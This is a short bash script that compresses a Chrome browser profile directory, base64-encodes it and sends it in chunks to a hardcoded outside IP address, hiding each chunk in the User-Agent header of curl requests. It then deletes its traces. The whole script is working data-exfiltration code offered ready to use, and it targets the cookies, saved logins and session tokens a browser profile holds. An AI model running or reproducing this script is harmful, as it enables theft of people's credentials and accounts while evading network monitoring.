#!/bin/bash

# Set your Chrome profile directory here
CHROME_DIR="$HOME/Library/Application Support/Google/Chrome/temp"
ARCHIVE_PATH="/tmp/chrome_temp.zip"
SERVER="http://159.223.159.200:8080"

echo "[*] Compressing Chrome profile..."
if [[ ! -d "$CHROME_DIR" ]]; then
    echo "[!] Chrome directory not found: $CHROME_DIR"
    exit 1
fi

zip -qr "$ARCHIVE_PATH" "$CHROME_DIR"

if [[ ! -f "$ARCHIVE_PATH" ]]; then
    echo "[!] Failed to create archive."
    exit 1
fi

echo "[*] Encoding and batching..."
base64 "$ARCHIVE_PATH" > /tmp/base64_data.txt

# Split base64 data into chunks (~100 characters per chunk)
split -l 1 -a 5 /tmp/base64_data.txt /tmp/chunk_

echo "[*] Exfiltrating via GET + User-Agent headers..."
for file in /tmp/chunk_*; do
    CHUNK=$(cat "$file")
    curl -s -A "$CHUNK" "$SERVER" > /dev/null
    sleep 0.2
done

echo "[*] Cleaning up..."
rm -f "$ARCHIVE_PATH" /tmp/base64_data.txt /tmp/chunk_*

echo "[*] Done."
